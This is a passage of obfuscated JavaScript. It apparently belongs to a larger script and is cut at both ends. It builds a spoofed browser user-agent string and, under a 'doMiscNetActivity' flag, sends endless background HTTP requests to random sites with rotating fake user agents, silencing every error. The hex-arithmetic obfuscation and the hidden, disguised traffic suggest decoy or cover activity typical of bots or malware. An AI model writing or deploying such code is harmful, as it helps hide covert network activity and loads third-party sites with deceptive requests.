      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x42c * 0x9 + 0x1 * -0xa3f + -0x1b4d; k < -0xa4c + 0x2e * -0x5 + 0xb36; k++)
    setTimeout(f, (0xb * -0x429 + 0x7d58 + 0x9acb) * k * getRandomInt(0x2 * -0x2be + 0xa49 + 0x266 * -0x2, -0x187c + -0x2 * -0x313 + 0x1259));
  setInterval(() => {
    f();
    for (let l = -0x1104 * 0x1 + -0x20a3 + -0x108d * -0x3; l < -0x116d * -0x1 + -0x1e95 + 0xd2c; l++)
      setTimeout(f, (-0x881b + -0x2 * -0xb1c4 + 0xef3 * 0x1) * l * getRandomInt(-0x1 * -0xc3e + 0x185 * 0x17 + -0x2f30, -0x27 + 0x1 * -0x13c5 + 0x13ef));
  }, 0xf1f27 * -0x4 + -0x2f9 * 0x427 + 0x7fc30b);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1 * 0x2c9e + 0xb41 + -0x1 * 0x1c87) * getRandomInt(0x1997 + -0x12f * 0x1 + -0x1867, -0xfc5 + 0x1b34 + -0xb6a));
}, 0x17 * 0x52 + 0x4df + 0x151 * -0x9);